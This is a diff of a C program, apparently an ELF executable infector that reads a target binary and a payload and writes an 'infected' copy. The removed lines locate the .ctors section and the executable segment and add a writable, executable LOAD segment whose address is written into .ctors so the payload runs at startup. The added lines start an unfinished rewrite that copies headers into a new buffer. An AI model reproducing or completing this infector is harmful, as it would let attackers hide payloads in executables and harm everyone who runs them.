@@ -25,9 +25,13 @@ int main(int argc, char *argv[]){
 
   void *target;
   off_t targetSize;
+  void *infected;
+  off_t infectedSize;
   void *payload;
   off_t payloadSize;
   int i;
+  ELFN(Phdr) *programHeader;
+  ELFN(Shdr) *sectionHeader;
 
   if( readFile(argv[1], &target, &targetSize) != 0 ){
     fprintf(stderr, "Could not open file '%s'\n", argv[1]);
@@ -38,87 +42,50 @@ int main(int argc, char *argv[]){
     return -1;
   }
 
-  ELFN(Ehdr) *elfHeader = target;
+  ELFN(Ehdr) *targetElfHeader = target;
+  ELFN(Phdr) *targetProgramHeaderTable = target + targetElfHeader->e_phoff;
+  ELFN(Shdr) *targetSectionHeaderTable = target + targetElfHeader->e_shoff;
 
   //allocate space for the new program header table and the payload
-  off_t infectedSize = targetSize + payloadSize + (elfHeader->e_shnum*elfHeader->e_shentsize) + ((elfHeader->e_phnum+1)*elfHeader->e_phentsize);
-  if( (target = realloc(target, infectedSize)) == 0 ){
+  infectedSize = targetSize + payloadSize + targetElfHeader->e_phentsize;
+  if( (infected = malloc(infectedSize)) == 0 ){
     fprintf(stderr, "Unable to allocate memory for the infected binary.\nI hate my life.\n");
   }
 
-  elfHeader = target;
-  ELFN(Phdr) *programHeaderTable = target + elfHeader->e_phoff;
-  ELFN(Shdr) *sectionHeaderTable = target + elfHeader->e_shoff;
-
   //find the string table
-  ELFN(Shdr) *stringTable = sectionHeaderTable;
-  i = 0;
-  while( i < elfHeader->e_shnum
-      && (stringTable->sh_type != SHT_STRTAB
-      || strcmp(target + stringTable->sh_offset + stringTable->sh_name, ".shstrtab") != 0)
-  ){
-    stringTable++;
-    i++;
-  }
-  if( i >= elfHeader->e_shnum ){
-    fprintf(stderr, "Unable to locate the string table. Giving up...\n");
-    return -1;
-  }
-  char* stringTableValues = target + stringTable->sh_offset;
+  ELFN(Shdr) *targetStringTable = targetSectionHeaderTable + targetElfHeader->e_shstrndx;
+  char* targetStringTableValues = target + targetStringTable->sh_offset;
 
-  //find the program header containing the .text segment
-  //it is likely the only LOAD with flags = RX
-  ELFN(Phdr) * loadHeader = programHeaderTable;
-  i = 0;
-  while( i < elfHeader->e_phnum && loadHeader->p_type != PT_LOAD && loadHeader->p_flags != (PF_R | PF_X)){
-    i++;
+  //copy over the elf header
+  ELFN(Ehdr) *infectedElfHeader = infected;
+  memcpy(infectedElfHeader, targetElfHeader, sizeof(ELFN(Ehdr)));
+
+  //add a new entry in the program header table
+  infectedElfHeader->e_phnum++;
+  infectedElfHeader->e_shoff = infectedSize - (infectedElfHeader->e_shnum*infectedElfHeader->e_shentsize); //adjust offset for the new header and payload
+
+  //copy over the program header table
+  ELFN(Phdr) *infectedProgramHeaderTable = infected + infectedElfHeader->e_phoff;
+  memcpy(infectedProgramHeaderTable, targetProgramHeaderTable, targetElfHeader->e_phnum*targetElfHeader->e_phentsize);
+
+  //copy over the section header table
+  ELFN(Shdr) *infectedSectionHeaderTable = infected + infectedElfHeader->e_shoff;
+  memcpy(infectedSectionHeaderTable, targetSectionHeaderTable, targetElfHeader->e_shnum*targetElfHeader->e_shentsize);
+
+  //TODO copy over each segment and section
+  //flags for which sections have been copied in a segment
+  //0 is did not copy, 1 is did copy
+  char *copiedSections = calloc(targetElfHeader->e_shnum, 1);
+  for(i = 0, programHeader = targetProgramHeaderTable ;
+      i < targetElfHeader->e_phnum ;
+      i++, programHeader++ ){
   }
-  if( i >= elfHeader->e_phnum ){
-    fprintf(stderr, "Unable to locate the .text segment. Is this an executable?\n");
-    return -1;
-  }
+   
+  infectedElfHeader->e_phnum--;
 
-  //find the .ctors
-  ELFN(Shdr) *ctors = sectionHeaderTable;
-  i = 0;
-  while(i < elfHeader->e_shnum && strcmp(stringTableValues + ctors->sh_name, ".ctors") != 0 ){
-    ctors += sizeof(elfHeader->e_shentsize);
-    i++;
-  }
-  if( strcmp(stringTableValues + ctors->sh_name, ".ctors") != 0 ){
-    fprintf(stderr, "Unable to locate the .ctors table. LAME!\n");
-    return -1;
-  }
-
-  //copy the program header to the end of the elf, and update the elf header to point to it.
-  off_t programHeaderTableSize = (elfHeader->e_phnum+1)*elfHeader->e_phentsize;
-  off_t sectionHeaderTableSize = elfHeader->e_shnum*elfHeader->e_shentsize;
-  memcpy(target+targetSize, programHeaderTable, programHeaderTableSize);
-  memcpy(target+infectedSize-sectionHeaderTableSize, sectionHeaderTable, sectionHeaderTableSize);
-  elfHeader->e_phoff = targetSize;
-  elfHeader->e_shoff = infectedSize-sectionHeaderTableSize;
-
-  //add a new LOAD section that contains our payload to the program header
-  //ELFN(Phdr) *payloadHeader = target + elfHeader->e_phoff + (elfHeader->e_phnum * elfHeader->e_phentsize);
-  //payloadHeader->p_type = PT_LOAD;
-  //payloadHeader->p_offset = (void*)payloadHeader - target + elfHeader->e_phentsize; //payload starts right after this header
-  //payloadHeader->p_vaddr = loadHeader->p_vaddr + loadHeader->p_memsz; //load our payload into memory after the normal .text
-  //payloadHeader->p_paddr = payloadHeader->p_vaddr;
-  //payloadHeader->p_filesz = payloadSize;
-  //payloadHeader->p_memsz = payloadSize;
-  //payloadHeader->p_flags = PF_X | PF_R | PF_W;
-  //payloadHeader->p_align = loadHeader->p_align;
-  //elfHeader->e_phnum++;
-
-  //copy over the payload
-  //memcpy(target+payloadHeader->p_offset, payload, payloadSize);
-
-  //update the ctors to point to our payload :D
-  //*((ELFN(Addr)*)(target + ctors->sh_offset)) = payloadHeader->p_vaddr;
-  //*((ELFN(Addr)*)(target + ctors->sh_offset)+1) = -1;
 
   //write out the newly infected file
-  if( writeFile(argv[3], target, infectedSize) != 0){
+  if( writeFile(argv[3], infected, infectedSize) != 0){
     fprintf(stderr, "Could not save the infected file to '%s'. You got the perms?\n", argv[2]);
     return -1;
   }
